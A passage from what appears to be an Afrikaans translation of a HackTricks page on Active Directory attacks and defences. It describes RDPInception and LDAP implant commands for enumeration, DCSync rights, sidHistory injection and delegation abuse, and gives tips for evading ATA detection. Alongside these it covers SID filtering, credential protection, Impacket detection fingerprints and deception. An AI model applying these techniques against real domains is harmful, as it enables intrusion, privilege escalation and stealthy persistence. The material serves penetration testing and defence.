Nog ’n manier om die vertroude domein te kompromitteer, is om te wag by ’n masjien waar ’n **gebruiker van die vertroude domein kan aanmeld** via **RDP**. Die aanvaller kan dan kode in die RDP-sessieproses inspuit en van daar af **toegang tot die slagoffer se oorspronklike domein kry**.\
Verder, as die **slagoffer sy hardeskyf gemonteer het**, kan die aanvaller vanuit die **RDP-sessie**-proses **backdoors** in die **hardeskyf se opstartlêergids** stoor. Hierdie tegniek word **RDPInception** genoem.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Versagting van misbruik van domeintrust

### **SID Filtering:**

- Die risiko van aanvalle wat die SID-geskiedeniskenmerk oor forest trusts uitbuit, word deur SID Filtering versag. Dit is by verstek op alle inter-forest trusts geaktiveer. Dit berus op die aanname dat intra-forest trusts veilig is, aangesien Microsoft die forest, eerder as die domein, as die sekuriteitsgrens beskou.
- Daar is egter ’n voorbehoud: SID filtering kan toepassings en gebruikerstoegang ontwrig, wat daartoe kan lei dat dit soms gedeaktiveer word.

### **Selective Authentication:**

- Vir inter-forest trusts verseker die gebruik van Selective Authentication dat gebruikers van die twee forests nie outomaties geverifieer word nie. Gebruikers het eerder uitdruklike toestemmings nodig om toegang tot domeine en bedieners binne die vertrouende domein of forest te kry.
- Dit is belangrik om daarop te let dat hierdie maatreëls nie beskerming bied teen die uitbuiting van die skryfbare Configuration Naming Context (NC) of aanvalle op die trust-account nie.

[**Meer inligting oor domeintrusts by ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-gebaseerde AD-misbruik vanaf on-host implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) herimplementeer bloodyAD-styl LDAP-primitiewe as x64 Beacon Object Files wat geheel en al binne ’n on-host implant (bv. Adaptix C2) loop. Operateurs bou die pack met `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laai `ldap.axs` en roep dan `ldap <subcommand>` vanaf die beacon aan. Alle verkeer gebruik die huidige aanmeldsekuriteitskonteks oor LDAP (389) met signing/sealing of LDAPS (636) met outomatiese sertifikaatvertroue, dus is geen socks-proxies of skyfspore nodig nie.<sup>[[4]](#references)</sup>

### LDAP-enumerasie aan die implant-kant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` en `get-groupmembers` los kort name/OU-paaie na volledige DNs op en stort die ooreenstemmende objekte uit.
- `get-object`, `get-attribute` en `get-domaininfo` haal arbitrêre eienskappe (insluitend sekuriteitsbeskrywers) plus die forest-/domeinmetadata vanaf `rootDSE` op.
- `get-uac`, `get-spn`, `get-delegation` en `get-rbcd` wys roast-kandidate, delegasie-instellings en bestaande [Resource-based Constrained Delegation](resource-based-constrained-delegation.md)-beskrywers direk vanaf LDAP.
- `get-acl` en `get-writable --detailed` ontleed die DACL om trustees, regte (GenericAll/WriteDACL/WriteOwner/eienskap-skryftoegang) en oorerwing te lys, wat onmiddellike teikens vir ACL-regte-eskalasie oplewer.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### LDAP-skryfprimitiewe vir eskalasie en volharding

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) laat die operator toe om nuwe principals of masjienrekeninge op te stel waar OU-regte bestaan. `add-groupmember`, `set-password`, `add-attribute` en `set-attribute` kaap teikens direk sodra write-property-regte gevind word.
- ACL-gerigte opdragte soos `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` en `add-dcsync` skakel WriteDACL/WriteOwner op enige AD-objek om in wagwoordterugstellings, beheer oor groeplidmaatskap of DCSync-replikasievoorregte, sonder om PowerShell/ADSI-artefakte agter te laat. `remove-*`-ekwivalente maak ingevoegde ACE’s skoon.

### Delegasie, roasting en Kerberos-misbruik

- `add-spn`/`set-spn` maak ’n gekompromitteerde gebruiker onmiddellik Kerberoastable; `add-asreproastable` (UAC-toggle) merk die gebruiker vir AS-REP-roasting sonder om die wagwoord aan te raak.
- Delegasiemakro’s (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) herskryf `msDS-AllowedToDelegateTo`, UAC-vlae of `msDS-AllowedToActOnBehalfOfOtherIdentity` vanaf die beacon. Dit aktiveer aanvalspaaie vir constrained/unconstrained/RBCD en skakel die behoefte aan remote PowerShell of RSAT uit.

### sidHistory-inspuiting, OU-verskuiwing en vorming van die aanvaloppervlak

- `add-sidhistory` spuit bevoorregte SID’s in die SID-geskiedenis van ’n beheerde principal in (sien [SID-History Injection](sid-history-injection.md)), wat stealthy toegangerfenis verskaf, geheel en al oor LDAP/LDAPS.
- `move-object` verander die DN/OU van rekenaars of gebruikers, sodat ’n aanvaller bates na OU’s kan verskuif waar gedelegeerde regte reeds bestaan, voordat `set-password`, `add-groupmember` of `add-spn` misbruik word.
- Noukeurig beperkte verwyderingsopdragte (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ens.) maak vinnige terugrol moontlik nadat die operator geloofsbriewe of volharding ingesamel het, wat telemetrie tot die minimum beperk.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Enkele algemene verdedigingstegnieke

[**Kom meer te wete oor hoe om geloofsbriewe te beskerm.**](../stealing-credentials/credentials-protections.md)

### **Verdedigingsmaatreëls vir die beskerming van geloofsbriewe**

- **Beperkings vir Domain Admins**: Dit word aanbeveel dat Domain Admins slegs by Domain Controllers mag aanmeld, en nie op ander gashere gebruik word nie.
- **Voorregte vir diensrekeninge**: Dienste behoort nie met Domain Admin (DA)-voorregte te loop nie, om sekuriteit te handhaaf.
- **Tydelike beperking van voorregte**: Take wat DA-voorregte vereis, behoort beperk te word in duur. Dit kan bereik word deur: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Versagting van LDAP-relay**: Oudit Event IDs 2889/3074/3075 en dwing dan LDAP signing plus LDAPS channel binding op DC’s/kliënte af om LDAP MITM/relay-pogings te blokkeer.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protokolvlak-vingerafdrukke van Impacket-aktiwiteit

As jy algemene AD-tradecraft wil opspoor, **moenie net staatmaak op artefakte wat die operator kan beheer nie**, soos hernoemde binaries, diensname, tydelike batch-lêers of uitvoerpaaie. Stel ’n basislyn op van hoe wettige Windows-kliënte [Kerberos](kerberos-authentication.md)-, [NTLM](../ntlm/README.md)-, SMB-, LDAP-, DCE/RPC- en WMI-verkeer opbou, en soek dan na **implementeringskenmerke** wat voortbestaan selfs nadat die operator `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` of `ntlmrelayx.py` gewysig het.<sup>[[8]](#references)</sup>

- **Kandidate met hoë sekerheid as selfstandige seine** (nadat dit teen jou eie basislyn gevalideer is):
  - Geënkripteerde DCE/RPC met `auth_context_id = 79231 + ctx_id`
  - DCE/RPC-verifikasie-opvulling gevul met `0xff`
  - LDAP Kerberos-binds wat ’n rou Kerberos `AP-REQ` direk in SPNEGO `mechToken` plaas
  - SMB2/3-onderhandelingsversoeke met ASCII-agtige `ClientGuid`-waardes
  - WMI `IWbemLevel1Login::NTLMLogin` wat die nie-standaard naamruimte `//./root/cimv2` gebruik
  - Hardgekodeerde Kerberos nonce-waardes
- **Beter as korrelasie-/puntetoekenningseienskappe**:
  - Min of gedupliseerde Kerberos-etype-lyste, ongewone/ontbrekende `PA-DATA`, of TGS-REQ-etype-volgordes wat van inheemse Windows verskil
  - NTLM Type 1-boodskappe sonder weergawe-inligting of Type 3-boodskappe met null-gasheername
  - Rou NTLMSSP wat in DCE/RPC gedra word in plaas van SPNEGO, ontbrekende DCE/RPC-verifikasievoetskrifte, of SPNEGO/Kerberos-OID-wanpassings
  - Verskeie van hierdie eienskappe vanaf dieselfde gasheer/gebruiker/sessie/tydvenster is baie sterker as enige enkele swak veld
- **Gebruik as verryking, nie as selfstandige waarskuwings nie**:
  - Versteklêername, uitvoerpaaie, ewekansige diensname, tydelike batch-name, verstekrekenaarrekeningname en nutsmiddelspesifieke HTTP/WebDAV/RDP/MSSQL-stringe
  - Operators kan dit maklik verander; dit word die beste gebruik om te verduidelik waarom ’n kruisprotokol-kluster verdag is
- **Operasionele notas**:
  - Sommige van hierdie seine vereis ontsluite verkeer, [PCAP/Zeek-ontleding](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW of sigbaarheid aan die dienskant
  - Valideer teen Samba/Linux-kliënte, toestelle en verouderde sagteware voordat dit as waarskuwings ingestel word
  - Bevorder opsporings van verryking -> jagtog -> waarskuwing namate jy vertroue in die basislyn opbou

### **Implementering van misleidingstegnieke**

- Misleiding behels die opstel van lokvalle, soos lokgebruikers of -rekenaars met eienskappe soos wagwoorde wat nie verval nie of wat as Trusted for Delegation gemerk is. ’n Gedetailleerde benadering sluit in die skep van gebruikers met spesifieke regte of om hulle by groepe met hoë voorregte te voeg.<sup>[[2]](#references)</sup>
- ’n Praktiese voorbeeld is die gebruik van nutsmiddels soos: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Meer oor die ontplooiing van misleidingstegnieke is beskikbaar by [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifisering van misleiding**

- **Vir gebruikersobjekte**: Verdagte aanduidings sluit in ’n atipiese ObjectSID, min aanmeldings, skeppingsdatums en ’n lae aantal verkeerde wagwoorde.
- **Algemene aanduidings**: Deur eienskappe van moontlike lokobjekte met dié van egte objekte te vergelyk, kan teenstrydighede onthul word. Nutsmiddels soos [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) kan help om sulke misleiding te identifiseer.

### **Omseiling van opsporingstelsels**

- **Omseiling van Microsoft ATA-opsporing**:
  - **Gebruikerenumerasie**: Vermy sessie-enumerasie op Domain Controllers om ATA-opsporing te voorkom.
  - **Kaartjie-impersonasie**: Die gebruik van **aes**-sleutels vir kaartskepping help om opsporing te ontduik deur nie na NTLM af te gradeer nie.
  - **DCSync-aanvalle**: Dit word aanbeveel om dit vanaf ’n nie-Domain Controller uit te voer om ATA-opsporing te vermy, aangesien direkte uitvoering vanaf ’n Domain Controller waarskuwings sal aktiveer.

## References

- [1] [’n Gids vir die aanval op domeintrusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Trusts vervals vir misleiding in Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Van Domain Admin tot Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF-versameling – LDAP-nutsmiddelstel in geheue vir Active Directory-uitbuiting](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Gebruik NTLM-hashes as ’n woordelys](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – ’n Ontleding van Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Neem Active Directory-rekeninge oor via Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Hoe om die veranderinge in Netlogon-beveiligde kanaalverbindings wat met CVE-2020-1472 verband hou, te bestuur](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [’n Reis na vergete Null Session- en MS-RPC-koppelvlakke](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID-filter as sekuriteitsgrens tussen domeine? (Deel 4) - Navorsing oor die omseiling van SID-filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID-filter as sekuriteitsgrens tussen domeine? (Deel 5) - Golden GMSA-trust-aanval - van child na parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID-filter as sekuriteitsgrens tussen domeine? (Deel 6) - Schema change-trust-aanval - van child na parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Van DA na EA met ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Eskaleer binne 5 minute van child domain se admins na enterprise admins deur AD CS te misbruik, ’n opvolg](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [’n ACE agter die hand: Ontwerp van Active Directory DACL-agterdeure](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Bronkode van die NetExec pre2k-module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - msDS-GroupMSAMembership-kenmerk](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
